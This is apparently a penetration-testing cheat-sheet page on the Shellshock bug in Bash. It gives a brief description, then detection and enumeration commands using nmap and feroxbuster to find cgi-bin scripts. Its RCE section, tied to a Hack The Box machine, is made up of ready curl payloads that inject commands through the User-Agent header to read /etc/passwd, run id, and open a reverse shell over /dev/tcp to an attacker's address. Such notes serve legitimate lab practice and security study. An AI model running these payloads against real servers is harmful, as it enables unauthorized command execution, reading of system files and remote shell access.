# Shellshock

Shellshock, also known as Bashdoor is a family of [security bugs](https://en.wikipedia.org/wiki/Security_bug) in the [Unix](https://en.wikipedia.org/wiki/Unix) [Bash](https://en.wikipedia.org/wiki/Bash_\(Unix_shell\)) [shell](https://en.wikipedia.org/wiki/Shell_\(computing\)), the first of which was disclosed on 24 September 2014.&#x20;

Shellshock could enable an attacker to cause Bash to [execute arbitrary commands](https://en.wikipedia.org/wiki/Arbitrary_code_execution) and gain unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests.

### How to detect and enumerate

{% code overflow="wrap" %}
```bash
# Bash version < 4.3
bash --version

# nmap 
nmap -sV -p- --script http-shellshock <target>

# Run directory check and check if you can find cgi-bin directory
feroxbuster -u http://<ip address> -f -n 50
# -f: force adding '/' at the end
# -n: set the number of threads
feroxbuster -u http://<ip address>/cgi-bin/ -x sh,cgi,pl
# -x: set extensions
```
{% endcode %}

### How to RCE&#x20;

{% code overflow="wrap" %}
```bash
# Hack the Box
# https://www.hackthebox.com/machines/shocker 
curl -H "User-Agent: () { :; }; /bin/cat /etc/passwd" <Target>
curl -H "User-Agent: () { :; }; echo $(</etc/passwd)" <Target>
curl -H "User-Agent: () { :;};echo ;echo 'id' | /bin/bash" <Target>
curl -H 'User-Agent: () { :;}; echo; echo "/bin/bash -i >& /dev/tcp/<ip address>/<port> 0>&1" | /bin/bash' <Target>
```
{% endcode %}
